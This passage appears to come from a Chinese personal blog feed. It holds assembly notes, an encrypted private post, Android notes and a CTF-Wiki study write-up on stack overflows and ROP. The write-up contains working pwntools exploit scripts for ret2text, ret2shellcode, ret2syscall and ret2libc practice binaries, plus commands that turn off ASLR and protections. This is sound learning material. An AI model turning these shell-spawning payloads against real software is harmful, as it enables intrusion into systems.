s可计算2的12次方61.在汇编语言中，标号代表一个地址，此程序中有一个标号（可以是任意字母），用来标识一个地址，这个地址处的指令就是所要循环的指令。62.能否将ffff：0~ffff：b中的数据直接累加到dx中？不能，直接的累加对位数有要求，相同位数的才能够直接相加。解决办法：将ax中的al和ah拆分开来用。63.出现在访问内存单元的指令中，用于显式地知名内存单元的段地址的ds，cs，ss，es，在汇编语言中称为段前缀。使用段前缀可以在某些情况下减少代码的行数。64.在不能确定一段内存空间中是否存放着重要的数据或者代码的时候，不能随意 向其中写入内容。Dos方式下，一般情况，0：200·0：2ff空间中没有系统或者其他程序的数据或者代码。65.lea, load effective address, 加载有效地址. 指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.66.movs/movsb/movsw/movsd edi,esi这些变体以串/字节/字/双字为单位，将esi的值赋给edi。67.movsx符号位扩展，byte-&gt;word，word–&gt;dword（扩展后高位全用符号位填充），然后实现mov。68.movzx零扩展，byte-&gt;word，word-&gt;dword（扩展后高位全部用零填充），然后实现mov。69.CMP指令根据比较两个操作数的结果设置C/O/Z标志位。若两个寄存器中的值相等，则Z标志位置1，否则置零。也可以直接用[地址]与寄存器进行比较。70.逆向工程中常用的三个标志位，C/O/Z，C为进位标志，记录运算时从最高有效位产生的进位值。执行加法运算时，最高有效位有进位时置1，否则置0.O标志位，溢出标志，在运行过程中，如果操作数超出了机器能表示的范围则称为溢出，溢出置1，未溢出置0.Z标志位最常用，运算结果为0时，Z标志位置1，否则置0. 71.XOR异或运算，当两个结果存在不同的时候进行或运算，相同的时候保持不变。NOT,非运算。72.test dest，src指令，与AND指令一样，对两个操作数进行按位的“与”运算，唯一不同的是不将结果保存到dest，不对操作数的内容进行修改，只修改标志位。实际操作中，一般都是test eax，eax，如果eax的值为0，则Z标志位置1.73.各种跳转及其条件：JMP 无条件跳转]]></content>
  </entry>
  <entry>
    <title><![CDATA[Summer Hoilday's Plan]]></title>
    <url>%2F2019%2F07%2F11%2FSummer%20Hoilday%20Plan%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read this private essay. Decrypt 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]]></content>
      <tags>
        <tag>plan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android]]></title>
    <url>%2F2019%2F07%2F01%2FAndroid%2F</url>
    <content type="text"><![CDATA[Android：我的第一行代码 0X00：Android系统架构Android大致可以分成四层架构：Linux内核层，系统运行库层，应用框架层和应用层。 Linux内核层：Android基于Linux内核，这一层为Android设备的各种硬件提供底层驱动。 系统运行库层：通过C/C++库为Android系统提供 应用框架层：主要提供构建应用程序时用到的API 应用层：安装在手机上的应用属于这一层 0X01:Android系统的四大组件活动(activity),服务(Service),广播接收器(Broadcast Receiver)和内容提供器(Content Provider). 活动是所有Android应用程序的门面，用户能够看到的都在活动中。服务一直在后台运行，即使应用退出也可以运行。广播接收器允许应用接收来自电话/短信等各处的广播消息，也可以从此向外发出广播消息。内容提供器实现应用程序之间的共享数据。 自带的一些组件：SQLite数据库(支持SQL语法，可以通过Android封装好的API进行操作。)其他的多媒体服务:音乐，视频，录音，地理位置定位等可以通过代码进行控制。]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF-Wiki Stack Overflow and ROP]]></title>
    <url>%2F2019%2F06%2F20%2FCTF-Wiki%2F</url>
    <content type="text"><![CDATA[CTF-Wiki中几道例题的思路 从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。 0X01–栈溢出的基本原理： 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。 函数调用指令: CALL(注意理解EBP的变化过程，它指向下一条指令要操作的数据) 大致过程: 参数入栈 返回地址入栈 代码区块跳转 栈帧调整: 保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈) 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部) 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶) 0X02–栈溢出的保护类型： 知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。 Canary：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。编译时的关闭指令：-fno-stack-protector ALSR与PIE(Position Independent Executable)：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功）编译时ALSR的关闭指令：echo 0&gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态，可以用cat+路径显示相关的参数：0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 PIE编译时的关闭指令：-no-pie，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。 Linux平台下的NX,Windows平台上的DEP：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 0X03–编译指令： gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie） sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_space ($ cat /proc/sys/kernel/randomize_va_space指令检查)exit（关闭ALSR)-z execstack（关闭NX保护） test.c -o test(由test.c生成test可执行文件) -g(GDB调试) 0X04–ROP原理： 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ropgadget，注意命令格式：ROPgadget –binary [文件名] –only’寄存器名|寄存器名’ | grep ‘eax’。 0X05–四种类型： 第一种类型ret2text: 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(“You Hava already controlled it.”); &#125;void vulnerable()&#123;char s[12];gets(s);puts(s);return;&#125;int main(int argc, char **argv) &#123;vulnerable();return 0;&#125; 只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。 EXP如下： 123456789101112131415##coding=utf8## 导入pwntools库from pwn import *## 构造与程序交互的对象，sh = process(&apos;./文件名&apos;)表示打本地，日自己。sh = process(&apos;./stack_example&apos;)## 已知了想要执行的函数地址success_addr = 0x0804843b## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)##print可以帮助自己看脚本执行到了哪一步print p32(success_addr)## 向程序发送字符串sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive() 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(“/bin/sh”)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。 123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。 1234567891011121314151617gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);───────────────────────────────────────────────────────────────────────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 断点下在Call处为什么是这个Call处？(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。 每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。 EXP如下： 1234567891011##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2text&apos;)target = 0x0804863ash.sendline(&apos;A&apos; * (0x6c+4) + p32(target))sh.interactive() 我觉得这道题倒是让我弄明白了buf的表示，位置关系。 上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。 第二种类型ret2shellcode： ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。 12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] 通过vmmap观察该bss段是否可执行： 12345678910111213141516171819202122232425262728293031323334gef➤ b mainBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.gef➤ rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:88 setvbuf(stdout, 0LL, 2, 0LL);─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]──── 6 int main(void) 7 &#123; → 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 ─────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0x8048536 → Name: main()─────────────────────────────────────────────────────────────────────────────────────────────────────gef➤ vmmap Start End Offset Perm Path0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rwx [stack] 所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。 EXP如下: 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2shellcode&apos;)## 自动生成shellcodeshellcode = asm(shellcraft.sh())buf2_addr = 0x804a080## shellcode先放入，剩余的再用&apos;A&apos;填充至112长度。sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))sh.interactive() shellcode放进去了不需要别的操作吗？这个buf2_addr指的是什么？如何通过调试确定需要填充的长度？ 第三种类型：ret2syscall：即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。 1execve(&quot;/bin/sh&quot;,NULL,NULL) 由于该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。 具体实现–ropgadgets 这个工具: only ‘pop|ret’ | grep ‘eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(“/bin/sh”,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。 平凡无奇的存在栈溢出漏洞的程序源码如下： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; 想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。 此外，我们需要获得 /bin/sh 字符串对应的地址。 1234➜ ret2syscall ROPgadget --binary rop --string &apos;/bin/sh&apos; Strings information============================================================0x080be408 : /bin/sh 以及int 0x80的地址： 123456789➜ ret2syscall ROPgadget --binary rop --only &apos;int&apos; Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4 EXP如下： 123456789101112131415#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./rop&apos;)## 找到的gadgets及其地址pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。 第四种类型：ret2libc libc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(“/bin/sh”). 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets((char *)&amp;v4); return 0;&#125; 确定存在栈溢出漏洞,用IDA找到了system函数,用ropgadget查找到”/bin/sh”。 则EXP如下： 1234567891011#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc1&apos;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])sh.sendline(payload)sh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。 当查找不到”/bin/sh”时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。 EXP如下： 12345678910111213##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc2&apos;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([&apos;a&apos; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 注意payload中的pop_ebx是用来平衡堆栈的。 同时找不到”/bin/sh”与system()函数地址的情况，用到了两个知识点： system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。 所以如果采用got表泄露(即输出某个函数对应的 got 